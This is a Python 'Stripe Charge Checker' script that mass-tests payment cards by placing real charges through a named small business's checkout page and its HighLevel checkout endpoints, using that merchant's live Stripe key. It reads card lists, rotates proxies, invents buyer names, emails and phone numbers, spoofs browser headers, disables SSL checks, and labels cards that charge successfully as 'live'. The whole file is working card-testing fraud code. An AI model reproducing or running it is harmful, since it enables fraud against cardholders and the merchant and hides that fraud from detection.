"""
Stripe Charge Checker — charges through gospelpianosimple.com/checkout
Uses same aiohttp session for page load + API call (preserves cookies/session)
"""
import asyncio
import re
import json
import random
import uuid
import warnings
import aiohttp
from datetime import datetime

warnings.filterwarnings('ignore')

STRIPE_KEY = "pk_live_MtxwO3obi7pfD7UZlGkfR2yj"
LOCATION_ID = "aIfbkdsjbDMNd2jXVzkv"
PRODUCT_ID = "698502efdd3a3371f5ffba3f"
STRIPE_PRICE_ID = "price_1SyLQ2HGUqx8Rh4ctWH7LU6f"
CHECKOUT_URL = "https://gospelpianosimple.com/checkout"
DOMAIN = "https://gospelpianosimple.com"


def generate_guid():
    return str(uuid.uuid4())


def generate_random_email():
    import string
    username = ''.join(random.choices(string.ascii_lowercase, k=random.randint(8, 12)))
    number = random.randint(100, 9999)
    domains = ['gmail.com', 'yahoo.com', 'outlook.com', 'protonmail.com']
    return "%s%d@%s" % (username, number, random.choice(domains))


def generate_random_phone():
    area = random.randint(200, 999)
    prefix = random.randint(200, 999)
    line = random.randint(1000, 9999)
    return "+1%d%d%d" % (area, prefix, line)


def parse_proxy_line(line: str):
    line = line.strip()
    if not line:
        return None
    protocol = 'http'
    if '://' in line:
        protocol, rest = line.split('://', 1)
    else:
        rest = line
    auth = None
    address = None
    if '@' in rest:
        left, right = rest.split('@', 1)
        if ':' in left and ':' not in right:
            auth = left
            address = right
        elif ':' in right and ':' not in left:
            address = left
            auth = right
        else:
            auth = left
            address = right
    else:
        parts = rest.split(':')
        if len(parts) == 2:
            host, port = parts
            address = "%s:%s" % (host, port)
        elif len(parts) == 4:
            host, port, user, pwd = parts
            auth = "%s:%s" % (user, pwd)
            address = "%s:%s" % (host, port)
        else:
            return None
    if auth:
        proxy_url = "%s://%s@%s" % (protocol, auth, address)
    else:
        proxy_url = "%s://%s" % (protocol, address)
    return proxy_url


async def process_stripe_charge(card_data, proxy_url=None):
    """
    1. GET checkout page (establish session/cookies)
    2. Create PaymentMethod via Stripe API
    3. POST to HighLevel checkout API with session cookies
    4. Return charge result
    """
    timeout = aiohttp.ClientTimeout(total=60)
    connector = aiohttp.TCPConnector(ssl=False)
    cookie_jar = aiohttp.CookieJar()

    async with aiohttp.ClientSession(
        timeout=timeout, connector=connector, cookie_jar=cookie_jar
    ) as session:
        try:
            ua = ('Mozilla/5.0 (Windows NT 10.0; Win64; x64) '
                  'AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36')

            # ── Step 1: GET checkout page to establish session ──
            get_headers = {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'user-agent': ua,
                'origin': DOMAIN,
            }
            async with session.get(
                CHECKOUT_URL, headers=get_headers, proxy=proxy_url
            ) as resp:
                await resp.text()  # consume to get cookies

            # ── Step 2: Create PaymentMethod via Stripe API ──────
            stripe_headers = {
                'accept': 'application/json',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://js.stripe.com',
                'referer': 'https://js.stripe.com/',
                'user-agent': ua,
            }
            stripe_data = {
                'type': 'card',
                'card[number]': card_data['number'],
                'card[cvc]': card_data['cvc'],
                'card[exp_month]': card_data['exp_month'],
                'card[exp_year]': card_data['exp_year'],
                'billing_details[address][country]': 'US',
                'guid': generate_guid(),
                'muid': generate_guid(),
                'sid': generate_guid(),
                'key': STRIPE_KEY,
                'payment_user_agent': 'stripe.js/5e27053bf5',
                '_stripe_version': '2024-06-20',
            }
            async with session.post(
                'https://api.stripe.com/v1/payment_methods',
                headers=stripe_headers,
                data=stripe_data,
                proxy=proxy_url,
            ) as pm_resp:
                pm_json = await pm_resp.json()

            if 'error' in pm_json:
                err = pm_json['error'].get('message', 'Stripe PM error')
                return False, "Stripe: %s" % err, pm_json

            pm_id = pm_json.get('id')
            if not pm_id:
                return False, "Stripe: failed to create Payment Method", pm_json

            card_info = pm_json.get('card', {})

            # ── Step 3: Try checkout APIs (with session cookies) ─
            name = "John %s" % random.choice(['Smith','Doe','Brown','Lee','Wilson'])
            email = generate_random_email()
            phone = generate_random_phone()

            payload = {
                'paymentMethodId': pm_id,
                'fullName': name,
                'email': email,
                'phone': phone,
                'locationId': LOCATION_ID,
                'productId': PRODUCT_ID,
                'priceId': STRIPE_PRICE_ID,
                'currency': 'usd',
            }

            post_headers = {
                'accept': 'application/json, text/plain, */*',
                'content-type': 'application/json',
                'origin': DOMAIN,
                'referer': CHECKOUT_URL,
                'user-agent': ua,
            }

            endpoints = [
                'https://services.leadconnectorhq.com/checkout/session',
                'https://rest.gohighlevel.com/v1/checkout/session',
            ]

            for url in endpoints:
                try:
                    async with session.post(
                        url, json=payload, headers=post_headers,
                        proxy=proxy_url,
                    ) as resp:
                        if resp.status < 500:
                            result = await resp.json()
                            charge_id = (result.get('charge') or
                                        result.get('chargeId') or
                                        result.get('id') or '')
                            status = result.get('status', '')
                            if charge_id or 'succeeded' in str(status).lower():
                                return True, "Approved (Charge: %s)" % charge_id, result
                            err = (result.get('error', {}).get('message') or
                                   result.get('message') or
                                   json.dumps(result)[:200])
                            return False, err, result
                        elif resp.status == 403:
                            continue  # try next endpoint
                except (asyncio.TimeoutError, aiohttp.ClientError):
                    continue
                except Exception:
                    continue

            # ── Step 4: Fallback — POST form to checkout URL ────
            form_headers = {
                'accept': '*/*',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': DOMAIN,
                'referer': CHECKOUT_URL,
                'user-agent': ua,
                'x-requested-with': 'XMLHttpRequest',
            }
            form_data = {
                'paymentMethodId': pm_id,
                'fullName': name,
                'email': email,
                'phone': phone,
                'locationId': LOCATION_ID,
                'productId': PRODUCT_ID,
            }
            try:
                async with session.post(
                    CHECKOUT_URL, data=form_data, headers=form_headers,
                    proxy=proxy_url,
                ) as resp:
                    text = await resp.text()
                    try:
                        result = json.loads(text)
                        charge_id = result.get('charge', result.get('chargeId', ''))
                        if charge_id:
                            return True, "Approved (Charge: %s)" % charge_id, result
                        err = result.get('error', {}).get('message',
                                                          result.get('message', 'Declined'))
                        return False, err, result
                    except json.JSONDecodeError:
                        return False, "Declined (HTTP %d)" % resp.status, {'raw': text[:200]}
            except Exception as e:
                return False, "System Error: %s" % str(e), {}

            return False, "All endpoints failed", {}

        except asyncio.TimeoutError:
            return False, "System Error: Request timed out", {}
        except Exception as e:
            return False, "System Error: %s" % str(e), {}


async def check_card(cc, mes, ano, cvv, proxy=None):
    card_data = {'number': cc, 'exp_month': mes, 'exp_year': ano, 'cvc': cvv}
    is_approved, response_msg, charge_data = await process_stripe_charge(
        card_data, proxy_url=proxy
    )
    is_live = is_approved or any(kw in response_msg.lower()
                                  for kw in ['approved', 'succeeded', 'charge: ch_'])

    card_info = {}
    charge_id = ''
    if isinstance(charge_data, dict):
        card_info = {
            'brand': charge_data.get('card', {}).get('brand', ''),
            'last4': charge_data.get('card', {}).get('last4', ''),
            'funding': charge_data.get('card', {}).get('funding', ''),
        }
        charge_id = charge_data.get('charge', charge_data.get('chargeId', ''))

    return {
        'cc': "%s|%s|%s|%s" % (cc, mes, ano, cvv),
        'is_live': is_live,
        'response': response_msg,
        'charge_id': charge_id,
        'card_info': card_info,
    }


async def mass_check(file_path, proxies=None, concurrency=10, progress_callback=None):
    if proxies is None:
        proxies = []

    cc_lines = []
    try:
        with open(file_path, 'r') as f:
            for line in f:
                line = line.strip()
                if line:
                    cc_lines.append(line)
    except FileNotFoundError:
        print("File not found: %s" % file_path)
        return []
    if not cc_lines:
        print("No cards to check.")
        return []

    sem = asyncio.Semaphore(concurrency)
    results = [None] * len(cc_lines)
    completed = 0

    async def worker(index, cc_line):
        nonlocal completed
        async with sem:
            parts = cc_line.strip().split('|')
            if len(parts) != 4:
                result = {
                    'cc': cc_line, 'is_live': False,
                    'response': 'Invalid format (need cc|mm|yy|cvv)',
                    'charge_id': '',
                }
            else:
                cc, mes, ano, cvv = parts
                max_retries = 3 if proxies else 1
                used_proxies = set()
                result = None
                for attempt in range(max_retries):
                    available = [p for p in proxies if p not in used_proxies] if proxies else []
                    proxy = random.choice(available) if available else (
                        random.choice(proxies) if proxies else None)
                    if proxy:
                        used_proxies.add(proxy)
                    result = await check_card(cc, mes, ano, cvv, proxy=proxy)
                    resp = result.get('response', '') or ''
                    if 'System Error' in resp and attempt < max_retries - 1:
                        await asyncio.sleep(1)
                        continue
                    break

            results[index] = result
            completed += 1
            emoji = "[+]" if result['is_live'] else "[-]"
            print("[%d/%d] %s %s - %s" % (completed, len(cc_lines), emoji,
                                           result['cc'], result['response']))
            if progress_callback:
                await progress_callback(result, completed, len(cc_lines))
            return result

    tasks = [asyncio.create_task(worker(i, line)) for i, line in enumerate(cc_lines)]
    await asyncio.gather(*tasks)
    results = [r for r in results if r is not None]
    approved = sum(1 for r in results if r.get('is_live'))
    declined = len(results) - approved
    print("\nMass Check Finished: %d approved, %d declined" % (approved, declined))
    return results
